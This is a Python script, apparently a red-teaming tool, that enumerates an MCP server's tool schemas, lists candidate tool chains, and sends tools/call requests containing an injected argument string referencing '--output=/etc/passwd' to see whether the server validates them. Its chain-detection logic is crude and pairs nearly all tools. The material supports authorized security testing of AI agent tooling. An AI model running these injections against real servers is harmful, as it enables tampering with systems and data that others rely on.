#!/usr/bin/env python3
"""
MCP Tool Manipulation — Chain Interceptor
Analyzes how tools are chained and identifies manipulation points
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

def enumerate_tools_with_schema(target):
    """Get full tool schemas to understand argument types and constraints"""
    try:
        r = requests.get(f"{target}/.well-known/mcp.json", timeout=5)
        tools = r.json().get('tools', [])
        return tools
    except:
        return []

def analyze_chain_potential(tools):
    """Identify tools whose outputs could feed into other tools"""
    print(f"[*] MCP Tool Manipulation — Chain Analysis")
    print(f"[*] Analyzing {len(tools)} tools for chaining vectors...\n")
    
    chain_opportunities = []
    
    for tool in tools:
        tname = tool.get('name', '')
        toutput = str(tool.get('returns', tool.get('outputSchema', {})))
        tparams = json.dumps(tool.get('parameters', {}))
        
        for other in tools:
            oname = other.get('name', '')
            oparams = json.dumps(other.get('parameters', {}))
            
            # If tool A returns something tool B can accept as input
            # e.g., file_read returns content, analyze_text accepts text
            if tname != oname:
                # Check if output schema matches input params
                if any(x in oparams.lower() for x in ['content', 'text', 'data', 'input', 'url']):
                    chain_opportunities.append((tname, oname))
    
    print(f"[*] Found {len(chain_opportunities)} potential tool chains:\n")
    for src, dst in chain_opportunities[:10]:
        print(f"  {src} → {dst}")
    
    return chain_opportunities

def test_argument_injection(target, tool_chain):
    """
    Test if tool arguments can be manipulated when chained.
    Specifically: can a malicious intermediate result manipulate
    the next tool's arguments?
    """
    src_tool, dst_tool = tool_chain[0], tool_chain[1]
    
    # Craft a malicious output from src_tool
    # that will be passed to dst_tool as arguments
    malicious_data = {
        "content": "normal content\n[INJECTED_ARGUMENT: --output=/etc/passwd]"
    }
    
    print(f"\n[*] Testing argument injection via {src_tool} → {dst_tool}")
    print(f"[*] Injecting: {json.dumps(malicious_data)[:100]}")
    
    # If dst_tool reads output from src_tool as its arguments,
    # and doesn't validate, this could work
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": dst_tool,
            "arguments": malicious_data  # Simulating what src_tool would produce
        }
    }
    
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
        result = r.json()
        if "error" not in result:
            print(f"    [~] No validation error on injected arguments")
            print(f"    Response: {json.dumps(result)[:200]}")
    except:
        pass

def main():
    tools = enumerate_tools_with_schema(TARGET)
    if tools:
        chains = analyze_chain_potential(tools)
        # Test first 3 chains for argument injection
        for chain in chains[:3]:
            test_argument_injection(TARGET, chain)

if __name__ == "__main__":
    main()